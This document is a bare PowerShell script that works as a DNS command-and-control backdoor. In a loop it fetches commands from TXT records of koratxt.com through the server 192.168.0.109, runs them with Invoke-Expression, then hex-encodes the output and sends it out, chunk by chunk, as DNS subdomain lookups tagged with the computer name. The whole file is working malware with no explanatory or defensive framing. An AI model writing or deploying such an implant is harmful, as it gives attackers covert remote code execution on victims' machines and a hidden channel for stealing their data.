function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $x = [int][char]$_
        if ($x -ge 32 -and $x -le 126) {
            $r += '{0:X}' -f $x
        }
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

function split_to_chunks($astring, $size=20) {
    $new_arr = @()
    $chunk_index=0
    $newastring = $astring + ("0" * $size)
    foreach($i in 1..[math]::floor($newastring.length / $size)) {
        $new_arr += StringToHex (@($newastring.substring($chunk_index,$size)))
        $chunk_index += $size
    }
    return $new_arr
}

function send_response($response) {
    $id = Get-Content env:computername
    if ($id.Length -gt 10) {
        $id.Substring(0,10)
    }
    $chunks = (split_to_chunks ($response.Replace("`r`n",";") -replace '\s\s+', ','))
    foreach ($j in $chunks) {
        $(Resolve-DnsName -Server "192.168.0.109" -Name "$id.$j.6f7574.koratxt.com" -Type TXT).Strings
    }
    $(Resolve-DnsName -Server "192.168.0.109" -Name "656e64.koratxt.com" -Type TXT)
    return $id
}


while ($true) {
    $rawtxt = $(Resolve-DnsName -Server "192.168.0.109" -Name "koratxt.com" -Type TXT).Strings
    if ($rawtxt.length -ne 0) {
        $response = (iex "$rawtxt") | Out-String
        if ($response.Length -gt 0) {
            send_response $response
        }
    }
    sleep -Seconds 15
}
